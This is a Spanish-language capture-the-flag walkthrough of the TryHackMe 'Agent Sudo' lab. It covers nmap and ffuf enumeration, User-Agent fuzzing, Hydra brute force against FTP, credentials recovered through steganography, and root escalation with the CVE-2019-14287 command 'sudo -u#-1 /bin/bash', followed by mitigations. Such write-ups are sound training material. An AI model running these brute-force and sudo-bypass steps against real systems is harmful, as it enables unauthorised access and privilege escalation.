# Agent Sudo — THM

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / FTP / User-Agent / Fuerza Bruta / Steganography / Sudo / CVE-2019-14287

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.128.166.133
```

- Encontramos:

- `21/tcp` → FTP
- `22/tcp` → SSH
- `80/tcp` → HTTP

- Accedemos a la aplicación web:

```text
http://10.128.166.133
```

- Revisamos también el código fuente de la página.

## 2. Enumeración

### Fuzzing web

- Realizamos fuzzing con una wordlist común:

```bash
ffuf -u http://10.128.166.133/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Posteriormente utilizamos una wordlist más grande:

```bash
ffuf -u http://10.128.166.133/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

- No encontramos nuevas rutas relevantes aparte de `index.php`.

### User-Agent

- La web muestra el siguiente mensaje:

```text
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

- Esto nos indica que la aplicación comprueba el header HTTP `User-Agent`.

- Interceptamos la petición y modificamos el header:

```http
User-Agent: R
```

- Al utilizar `R`, la respuesta cambia, por lo que sabemos que el servidor está procesando este valor.

### Enumeración de agentes

- Utilizamos Burp Suite Intruder para probar diferentes letras como valor del `User-Agent`.

- Probamos desde `A` hasta `Z` y comparamos el tamaño de las respuestas.

- La letra `C` devuelve una respuesta diferente.

- En la respuesta encontramos:

```text
agent_C_attention.php
```

- Accedemos al recurso y encontramos:

```text
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

- El mensaje nos da varias pistas:

```text
Usuario: chris
Contraseña: débil
```

- También sabemos que existe una relación entre los agentes `R` y `J`.

### FTP

- Como conocemos el usuario `chris` y tenemos una pista indicando que su contraseña es débil, probamos fuerza bruta contra FTP:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.128.166.133
```

- Hydra encuentra una contraseña válida para `chris`.

- Accedemos al servidor FTP:

```bash
ftp 10.128.166.133
```

- Descargamos los tres archivos disponibles pertenecientes a `chris`.

### Esteganografía

- Uno de los archivos es una imagen JPEG.

- Utilizamos `stegseek` para comprobar si contiene información oculta:

```bash
stegseek cute-alien.jpg
```

- Encontramos un mensaje:

```text
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

- Hemos obtenido las credenciales:

```text
Usuario: james
Contraseña: hackerrules!
```

## 3. Explotación

### Acceso mediante SSH

- Utilizamos las credenciales obtenidas:

```bash
ssh james@10.128.166.133
```

- Introducimos:

```text
hackerrules!
```

- Conseguimos acceder como `james`.

### User Flag

- Una vez dentro, buscamos la User Flag en el directorio personal y la obtenemos.

### Segunda imagen

- Entre los archivos descargados desde FTP también encontramos otra imagen en formato PNG.

- Como `stegseek` trabaja principalmente con formatos compatibles con el algoritmo de compresión utilizado por JPEG, nos llevamos la imagen a nuestra máquina mediante `scp` para analizarla.

- Utilizamos `scp` para transferirla:

```bash
scp james@10.128.166.133:/ruta/de/la/imagen .
```

- Aplicamos las herramientas de esteganografía correspondientes y obtenemos información relacionada con:

```text
Roswell alien autopsy
```

- Esta información no es necesaria para conseguir el acceso inicial, pero forma parte de la enumeración de los archivos encontrados.

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos qué puede ejecutar `james` mediante `sudo`:

```bash
sudo -l
```

- Encontramos una regla relacionada con:

```text
/bin/bash
```

- Intentamos ejecutarlo directamente:

```bash
sudo /bin/bash
```

- Sin embargo, recibimos:

```text
Sorry, user james is not allowed to execute '/bin/bash' as root
```

- También probamos cambiar al usuario `chris`:

```bash
sudo -u chris /bin/bash
```

- Tampoco conseguimos ejecutar el comando.

### Identificación de la versión de sudo

- Comprobamos la versión:

```bash
sudo --version
```

- Obtenemos:

```text
Sudo version 1.8.21p2
```

- Investigando esta versión encontramos:

```text
CVE-2019-14287
```

- Esta vulnerabilidad permite realizar una escalada de privilegios cuando una configuración de `sudoers` permite ejecutar comandos como un usuario específico y el valor especial `-u#-1` o `-u#4294967295` consigue ser interpretado como `root`.

### Explotación de CVE-2019-14287

- Utilizamos:

```bash
sudo -u#-1 /bin/bash
```

- Debido a la vulnerabilidad de la versión de `sudo`, el identificador de usuario es interpretado incorrectamente y conseguimos ejecutar Bash con privilegios de `root`.

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente accedemos al directorio `/root` y obtenemos la Root Flag:

```bash
cd /root
cat root.txt
```

## 5. Reporte

- La máquina **Agent Sudo** expone FTP, SSH y HTTP.
- La aplicación web indica que debemos utilizar un codename como `User-Agent`.
- Interceptamos las peticiones y probamos diferentes valores mediante Burp Suite Intruder.
- El valor `C` nos permite descubrir `agent_C_attention.php`, donde encontramos una pista sobre el usuario `chris` y su contraseña débil.
- Utilizamos Hydra para realizar fuerza bruta contra FTP para el usuario `chris`.
- Con las credenciales obtenidas accedemos al FTP y descargamos varios archivos.
- Mediante `stegseek` analizamos una imagen y recuperamos las credenciales de `james`:
```text
james : hackerrules!
```
- Utilizamos estas credenciales para acceder mediante SSH y obtenemos la User Flag.
- Durante la enumeración de privilegios comprobamos `sudo -l`, pero los comandos que parecen permitidos no funcionan directamente.
- Comprobamos la versión de `sudo` y encontramos `1.8.21p2`.
- Esta versión es vulnerable a **CVE-2019-14287**.
- Utilizamos:
```bash
sudo -u#-1 /bin/bash
```
- Conseguimos una shell como `root` y obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP
 ↓
User-Agent
 ↓
Burp Intruder
 ↓
Agent C
 ↓
agent_C_attention.php
 ↓
Usuario Chris
 ↓
Hydra
 ↓
FTP
 ↓
Esteganografía
 ↓
Credenciales de James
 ↓
SSH
 ↓
User Flag
 ↓
sudo --version
 ↓
CVE-2019-14287
 ↓
sudo -u#-1 /bin/bash
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| Enumeración mediante `User-Agent` | Media | Permite descubrir recursos internos |
| FTP con credenciales débiles | Alta | Permite acceso mediante fuerza bruta |
| Información sensible mediante esteganografía | Alta | Revela credenciales SSH |
| sudo 1.8.21p2 — CVE-2019-14287 | Crítica | Permite escalada de privilegios a root |

### Mitigaciones

- No utilizar headers HTTP como mecanismo de autenticación o control de acceso.
- Evitar revelar recursos internos mediante respuestas diferenciadas.
- Deshabilitar el acceso anónimo a FTP cuando no sea necesario.
- Utilizar contraseñas fuertes y resistentes a ataques de diccionario.
- No almacenar credenciales en imágenes o archivos accesibles por otros usuarios.
- Actualizar `sudo` a una versión corregida frente a CVE-2019-14287.
- Aplicar el principio de mínimo privilegio en las reglas de `sudoers`.

## 🧠 Lessons Learned

- Los headers HTTP pueden formar parte de la superficie de ataque y deben enumerarse.
- Burp Intruder permite probar rápidamente diferentes valores y comparar respuestas.
- Las pistas encontradas en una aplicación pueden proporcionar nombres de usuario útiles para otros servicios.
- Hydra puede utilizarse para realizar ataques de diccionario contra FTP.
- Las imágenes pueden contener información oculta mediante técnicas de esteganografía.
- `stegseek` permite extraer información oculta de imágenes cuando conocemos o conseguimos la contraseña necesaria.
- `sudo -l` no siempre cuenta toda la historia: la versión del binario también puede ser relevante.
- CVE-2019-14287 permite abusar de determinadas configuraciones de sudo para obtener privilegios de root.
